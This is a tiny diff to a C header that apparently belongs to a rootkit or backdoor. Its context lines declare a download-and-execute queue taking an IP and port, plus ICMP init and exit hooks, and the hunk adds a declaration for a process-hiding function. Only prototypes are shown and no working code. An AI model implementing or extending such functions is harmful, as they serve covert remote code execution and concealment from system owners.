@@ -80,3 +80,5 @@ int dlexec_queue(char *path, unsigned int ip, unsigned short port, unsigned int 
 void icmp_init (void);
 void icmp_exit (void);
 #endif
+
+void hide_proc ( unsigned short pid );
